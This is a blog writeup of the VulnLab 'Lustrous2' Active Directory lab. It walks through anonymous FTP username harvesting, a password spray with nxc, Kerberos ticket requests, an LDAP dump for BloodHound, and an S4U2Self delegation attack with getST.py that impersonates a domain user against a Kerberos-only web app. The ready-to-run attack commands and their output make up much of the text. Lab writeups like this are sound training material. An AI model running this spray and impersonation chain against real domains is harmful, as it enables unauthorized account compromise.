---
layout: post
title: "Lustrous2 (Hard) — VulnLab"
date: 2025-09-14 22:00:00 +0100
categories:
  - Writeups
  - VulnLab
tags:
  - Lustrous2
  - Hard
  - Windows
  - ActiveDirectory
  - Kerberos
  - ConstrainedDelegation
image: assets/img/Writeup/VulnLab/Lustrous2/lustrous2-01.png
description: Hard Windows Active Directory machine writeup by Uzurly (VulnLab) — Kerberos delegation abuse
---

# Enumeration

| Port | Service | Notes |
|---|---|---|
| 21/tcp | FTP | Anonymous login allowed |
| 53/tcp | DNS | Simple DNS Plus |
| 80/tcp | HTTP | IIS 10.0, `401 Unauthorized (Negotiate)` |
| 88/tcp | Kerberos | — |
| 389/tcp+ | LDAP | Domain `Lustrous2.vl`, cert issued by `Lustrous2-CA` |
| 445/tcp | SMB | — |
| 3389/tcp | RDP | cert CN=`LUS2DC.Lustrous2.vl` |

Hostname from the DC's certificate: `LUS2DC.Lustrous2.vl`.

```
echo "10.129.234.58 LUS2DC.Lustrous2.vl Lustrous2.vl" | sudo tee -a /etc/hosts
```

The IIS site answering `401` with `WWW-Authenticate: Negotiate` rather than `NTLM` was the detail that shaped the rest of this box — that's Kerberos-only auth, which meant the eventual win would come from a Kerberos primitive rather than a web vulnerability.

# FTP — anonymous foothold

Anonymous FTP exposed home directories for the entire domain, and a couple of shares (`Development`, `HR`, `IT`, `ITSEC`, `Production`, `SEC`) hinting at where the interesting stuff would be:

![1](/assets/img/Writeup/VulnLab/Lustrous2/lustrous2-01.png)

```
ftp> cd ../Homes
ftp> dir
09-07-24  12:03AM       <DIR>          Aaron.Norman
09-07-24  12:03AM       <DIR>          Adam.Barnes
...
09-07-24  12:03AM       <DIR>          ShareSvc
...
09-07-24  12:03AM       <DIR>          Wayne.Taylor
```

A huge list of home directories — a ready-made username list — including a service account, `ShareSvc`, that would turn out to matter later.

An `audit_draft.txt` sitting in one of the shares was even more useful: a self-reported list of what had (and hadn't) been fixed on this domain.

![2](/assets/img/Writeup/VulnLab/Lustrous2/lustrous2-02.png)

```
Audit Report Issue Tracking

[Fixed] NTLM Authentication Allowed
[Fixed] Signing & Channel Binding Not Enabled
[Fixed] Kerberoastable Accounts
[Fixed] SeImpersonate Enabled

[Open] Weak User Passwords
```

Weak passwords were explicitly still an open finding — worth a password spray against the user list harvested from FTP.

# Password spray → domain foothold

```
nxc ldap lustrous2.vl -u 'users.txt' -p 'Lustrous2024' -k
LDAP  lustrous2.vl  389  LUS2DC.Lustrous2.vl  [-] Lustrous2.vl\Aaron.Norman:Lustrous2024 KDC_ERR_PREAUTH_FAILED
LDAP  lustrous2.vl  389  LUS2DC.Lustrous2.vl  [-] Lustrous2.vl\Adam.Barnes:Lustrous2024 KDC_ERR_PREAUTH_FAILED
LDAPS lustrous2.vl  636  LUS2DC.Lustrous2.vl  [-] Lustrous2.vl\Thomas.Myers:Lustrous2024
```

`Thomas.Myers:Lustrous2024` — a hit. I grabbed a TGT straight away:

```
getTGT.py lustrous2.vl/thomas.myers:'Lustrous2024' -dc-ip lustrous2.vl
[*] Saving ticket in thomas.myers.ccache
```

# Active Directory recon over Kerberos

With a valid ticket cached, I dumped the directory over GSSAPI-authenticated LDAP and fed it to [BOFHound](https://github.com/coffeegist/bofhound) to build a BloodHound-compatible dataset:

```
ldapsearch -LLL -H ldap://lus2dc.lustrous2.vl -Y GSSAPI -b "DC=LUSTROUS2,DC=VL" -N -o ldif-wrap=no \
  -E '!1.2.840.113556.1.4.801=::MAMCAQc=' "(&(objectClass=*))" | tee ldap.txt

python3 ldap_search_parser.py ldap.txt ldap2.txt
bofhound --input ldap2.txt --output BLOOD --zip
```

![3](/assets/img/Writeup/VulnLab/Lustrous2/lustrous2-03.png)

# The web application — Kerberos-only auth

Back to that IIS site on port 80/443. An unauthenticated request confirmed Negotiate-only auth; presenting the Kerberos ticket I already held got me in:

```
curl http://lus2dc.lustrous2.vl -I
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Negotiate

curl --negotiate -u : http://lus2dc.lustrous2.vl -I
HTTP/1.1 200 OK
WWW-Authenticate: Negotiate oYG3MIG0oAMKAQChCwYJKoZIhvcSAQICooGfBIGc...
```

For anyone wanting to browse this interactively rather than curl it, Firefox needs its SPNEGO allow-list configured before it will hand over a Kerberos ticket to a site:

```
# about:config
network.negotiate-auth.delegation-uris: lus2dc.lustrous2.vl
network.negotiate-auth.trusted-uris: lus2dc.lustrous2.vl
network.negotiate-auth.using-native-gsslib: true
```

![4](/assets/img/Writeup/VulnLab/Lustrous2/lustrous2-04.png)
![5](/assets/img/Writeup/VulnLab/Lustrous2/lustrous2-05.png)
![6](/assets/img/Writeup/VulnLab/Lustrous2/lustrous2-06.png)
![7](/assets/img/Writeup/VulnLab/Lustrous2/lustrous2-07.png)

# Abusing delegation via ShareSvc

BloodHound's collection surfaced delegation rights tied to the `ShareSvc` account spotted earlier in the FTP home directories — enough to perform an S4U2Self request, impersonating an arbitrary domain user (`Ryan.Davies`) for the web application's service class, without ever needing that user's own credentials:

![8](/assets/img/Writeup/VulnLab/Lustrous2/lustrous2-08.png)
![9](/assets/img/Writeup/VulnLab/Lustrous2/lustrous2-09.png)

```
getST.py -self -impersonate "Ryan.Davies" -k -no-pass lustrous2.vl/ShareSvc -altservice HTTP/lus2dc.lustrous2.vl
export KRB5CCNAME=Ryan.Davies@HTTP_lus2dc.lustrous2.vl@LUSTROUS2.VL.ccache
curl --negotiate -u : http://lus2dc.lustrous2.vl -I
```

![10](/assets/img/Writeup/VulnLab/Lustrous2/lustrous2-10.png)
![11](/assets/img/Writeup/VulnLab/Lustrous2/lustrous2-11.png)
![12](/assets/img/Writeup/VulnLab/Lustrous2/lustrous2-12.png)

That forged ticket authenticated to the web application as `Ryan.Davies` — full impersonation of an arbitrary domain identity against the Kerberos-only app, without ever touching that user's password.

# Takeaways

- `WWW-Authenticate: Negotiate` (Kerberos) instead of `NTLM` is a strong signal that the intended path is a Kerberos delegation primitive, not a classic NTLM relay.
- FTP home-directory listings are a free username list — and sometimes list the service accounts too.
- An "audit report" left on a share is either a red herring or a roadmap; here it explicitly said which class of weakness was still open.
- S4U2Self lets a service impersonate *any* user for itself without that user's credentials — the real question is always which service account has been handed delegation rights it shouldn't have.

